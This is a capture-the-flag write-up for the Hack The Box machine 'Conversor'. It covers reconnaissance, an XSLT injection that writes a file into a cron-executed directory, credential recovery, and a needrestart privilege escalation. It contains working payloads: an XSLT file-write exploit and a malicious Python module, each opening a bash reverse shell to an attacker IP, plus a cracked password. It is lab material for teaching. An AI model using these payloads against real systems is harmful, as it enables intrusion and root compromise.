---
layout: post
title: Conversor - CTF
date: 2026-03-21
pid: "4898"
category: "CTFs"
difficulty: "EASY"
description: "Exploiting XSLT injection for arbitrary file write to achieve RCE via cron jobs, followed by priv-esc through a vulnerable needrestart version."
tags: [HTB, Linux, SSH]
---
### 1. Overview
This challenge involved exploiting a web application that processes XML and XSLT files. A flaw in how user-supplied XSLT files were handled allowed arbitrary file creation on the server. This was used to drop a malicious script into a directory executed by a cron job, resulting in remote code execution as the web server user. After gaining access, credentials were recovered from a local database, which allowed SSH access. Privilege escalation was then achieved by abusing a vulnerable version of `needrestart` to execute code as root.

### 2. Recon
I began this machine with the standard Nmap port and service scan.
```
└─$ nmap -sCV 10.129.7.153 --min-rate 5000
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan showed two open ports:

- **22 (SSH)**
- **80 (HTTP)**

The web server redirected to `conversor.htb`, so I added it to my hosts file and visited the site. The site had a simple login page that allowed account registration.

After logging in, I found that the site converts XML-formatted Nmap outputs into a styled report using XSLT.

While exploring the site, I found an option to download the application’s source code. Reading the source revealed that the backend was built using Flask. Looking at the `app.py` file, I noticed that uploaded XSLT files were not properly sanitized.
```
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"
```

User-controlled XSLT was being processed directly, which opened the door for abuse.

Additionally, the `install.md` file mentioned a cron job that executes Python scripts from a specific directory.
```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

This meant that if I could place a Python file in that directory, it would be executed automatically.
### 3. Foothold
With this info, I developed an exploit using a XSLT file. The goal was to write a Python script into the `/var/www/conversor.htb/scripts` directory, which would then be executed by the cron job.
```
# hehe.xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exploit="http://exslt.org/common" extension-element-prefixes="exploit" version="1.0">
    <xsl:template match="/">
        <exploit:document href="/var/www/conversor.htb/scripts/pwn.py" method="text">import os;os.system("bash -c 'bash >&amp; /dev/tcp/10.10.14.253/9001 0>&amp;1'")</exploit:document>
    </xsl:template>
</xsl:stylesheet>
```

After uploading and processing this file, the site created `pwn.py` in the scripts directory. Within a minute, the cron job executed the script and I received a shell as the `www-data` user.

While enumerating the system, I remembered that the site used a SQLite database stored in the `instance` directory. From the shell, I was able to access it and extract credentials:
```
'fismathack':'5b5c3ac3a1c897c94caad48e6c71fdec'
```

I cracked the hash using Hashcat, which revealed the password: `Keepmesafeandwarm`

Using these credentials, I was able to log in over SSH as the `fismathack` user.
### 4. Root
After gaining SSH access, I began priv-esc enumeration. As usual, I started with: `sudo -l`. This showed that the user could run `/usr/sbin/needrestart` as root without a password.

To exploit this, I created a Python module that would be loaded when `needrestart` executed.
```
# /dev/shm/pwn/importlib/__init__.py

import os

if os.geteuid() == 0:
        os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.253/9001 0>&1'")
```

I also created a simple Python script to keep a process running:
```
# /dev/shm/main.py

while True:
	pass
```

The exploit required three steps running in parallel.

First, I started a listener on my machine:
```
└─$ nc -lvnp 9001
```

Next, I ran the Python script with a modified `PYTHONPATH` so that my malicious module would be loaded:
```
fismathack@conversor:/dev/shm$ PYTHONPATH=/dev/shm/pwn python3 main.py
```

Finally, I executed `needrestart` with sudo:
```
fismathack@conversor:~$ sudo /usr/sbin/needrestart
```

When `needrestart` interacted with the running Python process, it loaded the malicious module, which triggered the reverse shell and provided root access.
### 5. Conclusion
Initial access was gained by abusing the site’s handling of user-supplied XSLT files, which allowed arbitrary file creation on the server. This was used to place a Python script in a directory executed by a cron job, resulting in code execution as the `www-data` user.

From there, credentials were recovered from a local SQLite database and cracked, allowing SSH access as the `fismathack` user. Privilege escalation was achieved by exploiting a vulnerable version of `needrestart`, where a Python module was loaded during execution and resulted in a root shell.
